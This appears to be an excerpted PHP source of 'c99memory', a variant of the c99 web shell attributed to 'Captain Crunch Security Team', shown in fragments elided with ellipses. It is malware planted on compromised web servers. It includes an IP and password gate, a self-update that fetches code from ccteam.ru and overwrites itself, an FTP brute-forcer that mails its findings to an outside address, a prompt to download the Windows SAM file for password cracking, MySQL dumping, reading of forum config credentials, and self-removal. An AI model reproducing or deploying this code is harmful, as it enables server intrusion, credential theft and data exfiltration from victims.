...
******************************************************************************************************
*
*                    c99memory.php v.1.0 pre-release build #16
*                            Freeware license.
*                                c CCTeaM.
*  c99memory - файл-менеджер через www-броузер.
*  Вы можете бесплатно скачать последнюю версию на домашней страничке продукта:
   http://ccteam.ru/releases/c99memory
*
*  WEB: http://ccteam.ru
*  ICQ UIN #: 656555
*
...
*
*  c Captain Crunch Security TeaM. Coded by tristram
*
******************************************************************************************************
*/
//Starting calls
...
$accessdeniedmess = "<a href=\"http://ccteam.ru/releases/c99memory\">c99memory v.".$shver."</a>: access denied";

$gzipencode = TRUE; //Encode with gzip?

$updatenow = FALSE; //If TRUE, update now (this variable will be FALSE)

$c99sh_updateurl = "http://ccteam.ru/update/c99memory/"; //Update server
...
$log_email = "loginisr@gawab.com"; //Default e-mail for sending logs
...
if (!$win)
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "ls -la"),
  array("ext online", "tar zxf online.tar.gz"),
  array("ext images", "tar zxf images.tar.gz"),
...
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://ccteam.ru/releases/cc99memory\">c99memory</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if (!empty($login))
{
 ...
 if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  ...
  header("WWW-Authenticate: Basic realm=\"c99memory ".$shver.": ".$login_txt."\"");
 ...
 else
 {
  ...
  if ($data{0} == "\x99" and $data{1} == "\x03")
  {
   ...
   if ($update)
   {
    ...
    {
     $fp = fopen(__FILE__,"w");
     if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download c99memory.php manually <a href=\"".$sourceurl."\"><u>here</u></a>.";}
...
function mysql_dump($set)
{
 ...
 $out = "# Dumped by c99memory.SQL v. ".$shver."
  ...
  if (!empty($submit))
  {
   ...
   else
   {
    if ($fqb_logging)
    {
     ...
     $fqb_log = "FTP Quick Brute (called c99memory v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
    ...
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@mail($fqb_logemail,"c99memory v. ".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
...
if ($act == "security")
{
 ...
 else
 {
  ...
  else {echo "<b><font color=green>You can crack winnt passwords. <a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ c.</font></b><br>";}
 }
...
if ($act == "selfremove")
{
 ...
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99memory v.".$shver."!"; c99shexit(); }
...
if ($act == "feedback")
{
 ...
 if (!empty($submit))
 {
  ...
  $body = "c99memory v.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
  if (!empty($fdbk_ref))
  {
   $tmp = @ob_get_contents();
   ob_clean();
  ...
  mail($suppmail,"c99memory v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
  ...
  elseif ($ft == "code")
  {
   if (ereg("php"."BB 2.(.*) auto-generated config file",$r))
   {
    ...
    if (count($arr == 18))
    {
     ...
     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99memory. Please, report us for fix.";}
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99memory v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>powered by</b></u></a> Captain Crunch Security Team | <a href="http://ccteam.ru"><font color="#FF0000">http://ccteam.ru</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
